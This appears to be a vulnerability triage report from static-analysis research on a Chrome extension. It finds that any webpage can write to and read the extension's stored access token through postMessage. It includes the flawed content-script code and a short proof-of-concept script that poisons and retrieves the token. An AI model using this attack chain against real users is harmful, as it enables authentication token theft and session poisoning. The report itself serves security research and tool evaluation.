# CoCo Analysis: adahoneonjbcodnbkdngadoffhdekhnf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 14 (storage write sinks + storage read sinks across 3 content scripts)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adahoneonjbcodnbkdngadoffhdekhnf/opgen_generated_files/cs_0.js
Line 513  addEventListener("message", function (msg) {
Line 514    if (msg.data.messageToBackend) {
Line 518    } else if (msg.data.publicateBrowserExtToken) {
```

**Code:**

```javascript
// Content script cs_0.js (extensionInjector_gmail.js) - Entry point
addEventListener("message", function (msg) {
  if (msg.data.messageToBackend) {
    chrome.extension.sendMessage(msg.data.messageToBackend);
  } else if (msg.data.publicateBrowserExtToken) { // ← attacker-controlled
    chrome.storage.sync.set(
      {
        accessToken: msg.data.publicateBrowserExtToken, // ← attacker data to storage
        token_exp: msg.data.expires, // ← attacker-controlled
      },
      function (d) {
        oauthWindow.close();
      }
    );
  } else if (msg.data.storeGet) {
    if (msg.data.storeGet == "accessToken") {
      chrome.storage.sync.get(["token_exp"], function (data) {
        const token_exp = data.token_exp;
        if (!token_exp) {
          // No token
        } else if (Number(token_exp) < new Date().getTime()) {
          console.log("Token has expired!");
        } else {
          chrome.storage.sync.get(["accessToken"], function (data) {
            postMessage({ storeData: data }, "*"); // ← storage data sent back to attacker
          });
        }
      });
    } else {
      chrome.storage.sync.get([msg.data.storeGet], function (data) {
        postMessage({ storeData: data }, "*"); // ← storage data sent back to attacker
      });
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Step 1: Attacker writes malicious data to storage
window.postMessage({
  publicateBrowserExtToken: "attacker_controlled_token",
  expires: "9999999999999"
}, "*");

// Step 2: Attacker retrieves stored data back
window.postMessage({
  storeGet: "accessToken"
}, "*");

// Step 3: Listen for response
window.addEventListener("message", function(event) {
  if (event.data.storeData) {
    console.log("Stolen data:", event.data.storeData);
    // Can exfiltrate to attacker server
  }
});
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.sync (including poisoning the accessToken used for authentication), then retrieve it back via postMessage. This allows storage poisoning attacks and information disclosure of legitimate stored data. The extension uses "externally_connectable": {"matches": ["*://*/*"]}, allowing any website to exploit this.

---

## Sink 2-6: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
Multiple flows from storage.sync.get → window.postMessage detected in cs_0.js, cs_1.js, and cs_2.js at various lines (394-395).

**Classification:** TRUE POSITIVE

**Reason:** These are the storage read side of the complete exploitation chain documented in Sink 1 above. CoCo detected both the write (attacker→storage) and read (storage→postMessage→attacker) paths.

---

## Conclusion

This extension has a **complete storage exploitation vulnerability**. Any website can:
1. Write arbitrary values to chrome.storage.sync via window.postMessage
2. Retrieve those values (and legitimate user data) back via the same mechanism
3. The extension explicitly allows any origin to communicate via externally_connectable: {"matches": ["*://*/*"]}

DoubleX marked this as FALSE POSITIVE, but CoCo correctly identified a TRUE POSITIVE vulnerability with a working attack path.
